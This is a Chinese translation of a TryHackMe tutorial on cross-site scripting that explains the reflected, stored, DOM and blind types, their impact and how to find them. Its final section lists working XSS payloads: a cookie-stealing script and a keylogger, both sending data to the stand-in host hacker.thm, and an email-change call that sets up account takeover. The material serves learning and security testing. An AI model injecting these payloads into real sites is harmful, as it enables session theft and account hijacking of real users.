# Cross-site Scripting
## 前言
翻阅自 tryhackme 的 XSS 房间（纯手工），我的翻译可能有点别扭，英文好的读者朋友们可以看看原文：https://tryhackme.com/room/xssgi
>坦白地说我觉得 tryhackme 的讲漏洞的房间都不是特别好，但是入门足矣。
## 反射型XSS
在一个HTPP请求中，当用户提供的数据在没有任何验证的情况下就被包含在网页中，此时就容易出现反射型XSS漏洞。
### 样例场景
假设我们有一个网站，若输入了不正确的数据，那么网站就会展示错误信息给我们。错误信息的内容来自于 url 查询字符串中的 error 参数，同时该内容被直接地插入到网页的源代码中![](https://i.imgur.com/pzdoZeC.png)
如果应用程序没有检查 error 参数的内容，那么攻击者就可以插入恶意的代码。

**比如插入如下的恶意JS代码：**

![](https://i.imgur.com/cJSLQ3R.png)
![](https://i.imgur.com/Nz9s035.png)

以上漏洞可以用下图的场景来描述：

![](https://i.imgur.com/9GV6EZE.png)
1. 攻击者发送一个包含恶意 payload 的链接给受害者
2. 受害者点击链接并被带到存在漏洞的网站
3. 包含攻击者恶意脚本的链接在含有漏洞的网站上执行
4. 攻击者的脚本将搜集到的数据发送给攻击者，攻击者能够偷取受害者的Cookie，这将允许攻击者登录受害者的账户。

### 潜在影响

攻击者可以向潜在受害者发送链接或将其嵌入到另一个网站的 iframe 中，其中包含 JavaScript payload ，使他们在浏览器上执行代码，可能会泄露会话或客户信息。

### 如何检测反射型XSS

需要测试每个可能的输入点，包括：
- 在 URL 查询字符串中的参数
- URL 文件路径
- HTTP 头部（尽管在实际中不太可能存在反射型XSS）

一旦你已找到一些被 web 应用程序反射回来的数据，那么你就需要确认你可以成功地执行你的 JavScript payload。你的 payload 将会依赖于你的代码在应用程序中被反射的位置。

**小问题**

在一个 URL 中，什么位置是测试反射型XSS的好地方？

## 存储型XSS
顾名思义，XSS payload 被存储到了 web 应用程序中（例如在数据库中）并在其他用户访问站点或是网页时被执行。

### 样例场景
有一个允许用户发表评论的博客网站，网站没有检查这些评论是否包含 JavaScirpt，也没有对任何恶意代码进行过滤。如果我们现在发表一个包含 JavaScript 的评论，等该评论被存储到数据库中之后，那么每个访问该评论的用户都将会在他们的浏览器上  运行 JavaScript 代码。
![](https://i.imgur.com/6H99dwT.png)

1. 攻击者将恶意 payload 嵌入到网站的数据库中
2. 对网站的每个浏览都会使得恶意脚本被激活
3. 攻击者的脚本将搜集到的数据发送给他们，他们能够偷取受害者的 cookie，这将允许攻击者登录受害者的账户。

### 潜在的影响
恶意的 JavaScript 脚本能够将用户重定向到另一个网站，偷取用户的会话 cookie 或是以用户的身份进行其他的网站行为。

### 如何检测存储型XSS

和反射型 XSS 的操作基本一样，都是要测试所有可能的输入点。但是要测试那些看起来会被存储的，同时又会被展示在其他的用户可以访问的某个区域的所有可能的输入点，一些小例子可能包括：

- 在一个博客网站上的评论
- 用户配置信息
- 网站列表

有时开发人员认为限制客户端的输入值已经足够好了，所以将值更改为 web 应用程序不期望的值是发现存储型 XSS 的一个很好的来源。举个例子，一个年龄字段，期望从下拉菜单中得到一个整数，但是您手动发送请求，而不是使用允许您尝试恶意有效负载的表单。
一旦你已经找到某个被存储在 web 应用程序中的数据，那么你需要确认你能成功地运行你的 JavaScript payload

## DOM 型 XSS
### 什么是 DOM？
DOM表示文档对象模型（Document Object Model），是一个 HTML 和 XML 文档的编程接口。其代表了页面以便程序能够改变文档的结构、样式、内容等。
一个 web 页面是一个文档，该文档可以展示在浏览器的窗口中或是作为 HTML 源。一个 HTML DOM 如下图所示：
![](https://i.imgur.com/LLBjXoc.png)
如果你想学习更多有关 DOM 的知识，可以参考 [w3.org](https://www.w3.org/TR/REC-DOM-Level-1/introduction.html)

**对 DOM 进行漏洞利用**
DOM 型 XSS 是指 JavaScript 直接在浏览器中执行，无需加载任何新页面或将数据提交给后端代码。执行发生在网站 JavaScript 代码作用于输入或用户交互时。

### 样例场景
网站的 JavaScript 从 window.location.hash 参数中获取内容然后将其写到当前页面正在查看的部分。网站没有对 hash 的内容进行恶意代码检查，允许攻击者注入他们选择的 JavaScript 到 web 页面中。

### 潜在的影响
精心设计的链接被发送给潜在的受害者，将他们重定向到另一个网站，或是从网页中和用户的会话中偷取内容。

### 如何测试 DOM 型 XSS？
测试 DOM 型 XSS 是一个比较有挑战的工作，需要相当数量的 JavaScript 的知识以看懂源代码。你需要查找代码中访问特定变量的部分，且这些变量能被攻击者完全控制，比如 “window.location.x” 参数。
一旦你已找到这些代码串，您需要查看它们是如何处理的，以及这些值是否曾被写入网页的 DOM 或传递给不安全的 JavaScript 方法，例如 eval()。

## Blind XSS-XSS 盲打
Blind XSS 有点类似于存储型 XSS，同样是 payload 被存储到网站中并且其他用户可以查看，但是不同之处在于我们无法看到 Blind XSS 的 payload 是否生效。
### 样例场景
一个网站有一个联系表格，你可以在上面给工作人员发消息。网站未对消息的内容作恶意代码检查，允许攻击者输入他们想要的一切数据。然后，这些消息会变成支持工单，员工可以在私人门户网站上查看这些工单。

### 潜在影响
使用正确的 payload，攻击者的 JS 脚本就能回调到他们的网站，并揭示出员工们的门户网站、员工的 cookies 甚至是正被查看的门户网站的内容。之后攻击者就有可能劫持员工的会话并有权访问私人站点。
### 如何检测 Blind XSS
当检测 Blind XSS 漏洞时，你需要确保你的 payload 有一个 回调（通常是一个 HTTP 请求），因为只有这样你才能知道你的代码是否被执行了。
一个流行的用于 Blind XSS 的工具是 [xsshunter](https://xsshunter.com/)，尽管你可以用JS写一个你自己的工具，但是 xsshunter 会自动捕捉 cookies、URLS、页面内容等。

### 一些常见的 XSS payload
#### POC
```javascript=
<script>alert('XSS');</script>
```
#### 偷取会话
```javascript=
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```
#### 抓如用户输入
```javascript=
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```
#### 修改用户邮箱
这个 payload 比上面的例子具体得多。这将涉及调用特定的网络资源或 JavaScript 函数。例如，假设有一个名为 user. changeemail() 的 JavaScript 函数用于更改用户的电子邮件地址。你的 payload 可以是这样的：
```javascript=
<script>user.changeEmail('attacker@hacker.thm');</script>
```
现在该帐户的电子邮件地址已经更改，攻击者可能会执行重置密码攻击。
